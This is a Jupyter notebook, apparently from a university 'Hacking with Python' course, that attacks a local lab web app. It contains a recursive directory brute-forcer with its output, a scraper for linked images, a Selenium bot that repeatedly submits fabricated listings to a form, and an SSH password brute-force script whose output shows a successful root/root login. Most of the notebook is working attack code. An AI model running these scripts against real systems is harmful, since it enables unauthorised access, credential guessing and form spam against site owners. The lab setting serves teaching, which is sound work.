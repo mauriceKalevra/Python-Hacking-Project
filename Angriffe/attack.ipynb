{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import queue\n",
    "import threading\n",
    "import os\n",
    "import requests\n",
    "from urllib.request import urlopen, Request\n",
    "from urllib.error import HTTPError\n",
    "from bs4 import BeautifulSoup\n",
    "import wget\n",
    "from urllib import request\n",
    "import urllib.request, urllib.error, urllib.parse\n",
    "import re\n",
    "from selenium import webdriver\n",
    "from selenium.webdriver.chrome.service import Service\n",
    "import time\n",
    "from selenium.webdriver.common.by import By\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "class MySpider():\n",
    "    def __init__(self):\n",
    "        pass\n",
    "        \n",
    "    def mygobuster(self,target):\n",
    "        wordlist = [a.strip() for a in open(\"wordlist.txt\")]\n",
    "        filters = [\".html\",\".css\",\"jpg\", \"\",\".js\",\".md\",\".png\"]\n",
    "        html = open(\"html.txt\", \"a+\") \n",
    "        for word in wordlist:\n",
    "            for f in filters:\n",
    "                url = target+word+f\n",
    "                re = requests.head(url)\n",
    "\n",
    "                if re.status_code==301 or re.status_code==401:\n",
    "                    print(\"Directory found: \", re.url, re.status_code)\n",
    "                    newurl = re.url+\"/\"\n",
    "                    \n",
    "                    self.mygobuster(newurl)\n",
    "\n",
    "                elif re.status_code==200:\n",
    "                    print(\"Found: \", re.url, re.status_code)\n",
    "                    response = urllib.request.urlopen(url)\n",
    "                    if \".html\" in re.url:\n",
    "                        html.write(re.url+\"\\n\")\n",
    "                    try:\n",
    "                        Content = response.read().decode('utf-8')\n",
    "                        f = open(\"found/\"+str(re.url).replace(\"/\",\"\"), 'w+')\n",
    "                        f.write(Content)\n",
    "                        f.close()\n",
    "                    except:\n",
    "                        Content = response.read()\n",
    "                        f = open(\"found/\"+str(re.url).replace(\"/\",\"\"), 'wb+')\n",
    "                        f.write(Content)\n",
    "                        f.close()\n",
    "                else:\n",
    "                    continue\n",
    "\n",
    "    def CSSbuster(self, target):\n",
    "        r  = requests.get(\" http://172.17.0.2:1337/stylesheet.css\")\n",
    "        data = r.text\n",
    "        l = []\n",
    "        for i in re.findall('url\\(([^)]+)\\)',data):\n",
    "            l.append(i)\n",
    "        s = [x[2:].strip('\"\"') for x in l[:2]]\n",
    "        for j in s:\n",
    "            response = urllib.request.urlopen(target+j)\n",
    "            if response.code==200:\n",
    "                print(\"Picture found:\", target+j)\n",
    "                con = response.read()\n",
    "                f = open(\"found/\"+str(response.url).replace(\"/\",\"\"), 'wb+')\n",
    "                f.write(con)\n",
    "            else:\n",
    "                pass\n",
    "    \n",
    "    \n",
    "    def myBot(self):\n",
    "        \n",
    "        s=Service('/home/sleven/Studium/Sem5/Hacking-mit-Python/geckodriver')\n",
    "        browser = webdriver.Firefox(service=s)\n",
    "        for url in open(\"html.txt\"):\n",
    "            if url==\"http://172.17.0.2:1337/biete.html\\n\":\n",
    "                browser.get(url)\n",
    "                eingabe = browser.find_element(By.ID,\"ort\")\n",
    "                eingabe.send_keys(\"Salzburg\")\n",
    "                time.sleep(1)\n",
    "                eingabe2 = browser.find_element(By.ID,\"preis\")\n",
    "                eingabe2.send_keys(\"1500\")\n",
    "                time.sleep(1)\n",
    "                eingabe2 = browser.find_element(By.ID,\"zimmer\")\n",
    "                eingabe2.send_keys(\"5\")\n",
    "                time.sleep(1)\n",
    "                eingabe3 = browser.find_element(By.ID,\"flaeche\")\n",
    "                eingabe3.send_keys(\"500\")\n",
    "                time.sleep(1)\n",
    "                eingabe4 = browser.find_element(By.ID,\"kontakt\")\n",
    "                eingabe4.send_keys(\"Mori.r@web.de\")\n",
    "                time.sleep(1)\n",
    "\n",
    "                ein = browser.find_element(By.ID,\"saveimmoButton\")\n",
    "                ein.click()\n",
    "                time.sleep(1)\n",
    "            browser.get(url)\n",
    "            time.sleep(1)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Directory found:  http://172.17.0.2:1337/data 301\n",
      "Directory found:  http://172.17.0.2:1337/data/about 301\n",
      "Found:  http://172.17.0.2:1337/data/about/index.html 200\n",
      "Directory found:  http://172.17.0.2:1337/data/faq 301\n",
      "Found:  http://172.17.0.2:1337/data/faq/index.html 200\n",
      "Directory found:  http://172.17.0.2:1337/data/impressum 301\n",
      "Found:  http://172.17.0.2:1337/data/impressum/index.html 200\n",
      "Directory found:  http://172.17.0.2:1337/data/datenschutz 301\n",
      "Found:  http://172.17.0.2:1337/data/datenschutz/index.html 200\n",
      "Directory found:  http://172.17.0.2:1337/data/about 301\n",
      "Found:  http://172.17.0.2:1337/data/about/index.html 200\n",
      "Directory found:  http://172.17.0.2:1337/data/impressum 301\n",
      "Found:  http://172.17.0.2:1337/data/impressum/index.html 200\n",
      "Directory found:  http://172.17.0.2:1337/img 301\n",
      "Directory found:  http://172.17.0.2:1337/img/background-images 301\n",
      "Found:  http://172.17.0.2:1337/about.html 200\n",
      "Found:  http://172.17.0.2:1337/index.html 200\n",
      "Found:  http://172.17.0.2:1337/biete.html 200\n",
      "Found:  http://172.17.0.2:1337/biete 200\n",
      "Found:  http://172.17.0.2:1337/angebote.html 200\n",
      "Found:  http://172.17.0.2:1337/faq.html 200\n",
      "Directory found:  http://172.17.0.2:1337/js 301\n",
      "Found:  http://172.17.0.2:1337/js/slideshow.js 200\n",
      "Directory found:  http://172.17.0.2:1337/static 301\n",
      "Directory found:  http://172.17.0.2:1337/static/js 301\n",
      "Directory found:  http://172.17.0.2:1337/static/css 301\n",
      "Found:  http://172.17.0.2:1337/static/css/bootstrap-grid.css 200\n",
      "Directory found:  http://172.17.0.2:1337/static/bootstrap-4.0.0 301\n",
      "Found:  http://172.17.0.2:1337/static/bootstrap-4.0.0/index.html 200\n",
      "Directory found:  http://172.17.0.2:1337/static/bootstrap-4.0.0/js 301\n",
      "Found:  http://172.17.0.2:1337/static/bootstrap-4.0.0/README.md 200\n",
      "Found:  http://172.17.0.2:1337/stylesheet.css 200\n",
      "Found:  http://172.17.0.2:1337/impressum.html 200\n",
      "Found:  http://172.17.0.2:1337/datenschutz.html 200\n",
      "Found:  http://172.17.0.2:1337/angebote.html 200\n",
      "Found:  http://172.17.0.2:1337/myangebote.html 200\n",
      "Found:  http://172.17.0.2:1337/suche.html 200\n",
      "Found:  http://172.17.0.2:1337/script.js 200\n",
      "Found:  http://172.17.0.2:1337/README.md 200\n",
      "Found:  http://172.17.0.2:1337/placeholder.png 200\n",
      "Directory found:  http://172.17.0.2:1337/favicon_io 301\n",
      "Found:  http://172.17.0.2:1337/about.html 200\n",
      "Found:  http://172.17.0.2:1337/impressum.html 200\n",
      "Picture found: http://172.17.0.2:1337/data/bgscreen.png\n",
      "Picture found: http://172.17.0.2:1337/data/pexels-pixabay-273209.jpg\n"
     ]
    }
   ],
   "source": [
    "S = MySpider()\n",
    "S.mygobuster(\"http://172.17.0.2:1337/\")\n",
    "S.CSSbuster(\"http://172.17.0.2:1337/\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Selenium**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [],
   "source": [
    "from selenium import webdriver\n",
    "from selenium.webdriver.chrome.service import Service\n",
    "import time\n",
    "from selenium.webdriver.common.by import By"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [],
   "source": [
    "s=Service('/home/sleven/Studium/Sem5/Hacking-mit-Python/geckodriver')\n",
    "browser = webdriver.Firefox(service=s)\n",
    "url = 'http://172.17.0.2:1337/biete.html'\n",
    "#driver = webdriver.Firefox(executable_path=\"/home/sleven/Studium/Sem5/Hacking-mit-Python/geckodriver\")\n",
    "browser.get(url)\n",
    "time.sleep(2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [],
   "source": [
    "def myBot():\n",
    "    s=Service('/home/sleven/Studium/Sem5/Hacking-mit-Python/geckodriver')\n",
    "    browser = webdriver.Firefox(service=s)\n",
    "    for url in open(\"html.txt\"):\n",
    "        if url==\"http://172.17.0.2:1337/biete.html\\n\":\n",
    "            browser.get(url)\n",
    "            eingabe = browser.find_element(By.ID,\"ort\")\n",
    "            eingabe.send_keys(\"Salzburg\")\n",
    "            time.sleep(1)\n",
    "            eingabe2 = browser.find_element(By.ID,\"preis\")\n",
    "            eingabe2.send_keys(\"1500\")\n",
    "            time.sleep(1)\n",
    "            eingabe2 = browser.find_element(By.ID,\"zimmer\")\n",
    "            eingabe2.send_keys(\"5\")\n",
    "            time.sleep(1)\n",
    "            eingabe3 = browser.find_element(By.ID,\"flaeche\")\n",
    "            eingabe3.send_keys(\"500\")\n",
    "            time.sleep(1)\n",
    "            eingabe4 = browser.find_element(By.ID,\"kontakt\")\n",
    "            eingabe4.send_keys(\"Mori.r@web.de\")\n",
    "            time.sleep(1)\n",
    "\n",
    "            ein = browser.find_element(By.ID,\"saveimmoButton\")\n",
    "            ein.click()\n",
    "            time.sleep(1)\n",
    "        browser.get(url)\n",
    "        time.sleep(1)\n",
    "        "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [],
   "source": [
    "myBot()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 70,
   "metadata": {},
   "outputs": [],
   "source": [
    "import urllib3"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**SSH Angriff**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [],
   "source": [
    "import sys\n",
    "import paramiko"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [],
   "source": [
    "import sys\n",
    "import paramiko\n",
    "def attackssh(ip, pwfile):\n",
    "    print(\"Attacking ssh.....\")\n",
    "    ssh = paramiko.SSHClient()\n",
    "    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n",
    "    for line in open(pwfile, \"r\").readlines():\n",
    "        [username, password] = line.strip().split()\n",
    "        try:\n",
    "            print(f\"Trying with {username} {password}\")\n",
    "            ssh.connect(ip, username=username,password=password)\n",
    "        except paramiko.AuthenticationException:\n",
    "            print(\"Failed!\")\n",
    "            continue\n",
    "        print(f\"Success with : {username}\\{password}\")\n",
    "        break\n",
    "\n",
    "        "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Attacking ssh.....\n",
      "Trying with admin password\n",
      "Failed!\n",
      "Trying with root toor\n",
      "Failed!\n",
      "Trying with admin admin\n",
      "Failed!\n",
      "Trying with root root\n",
      "Success with : root\\root\n"
     ]
    }
   ],
   "source": [
    "\n",
    "Attackssh(\"172.17.0.2\",\"sshwordlist.txt\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.13"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
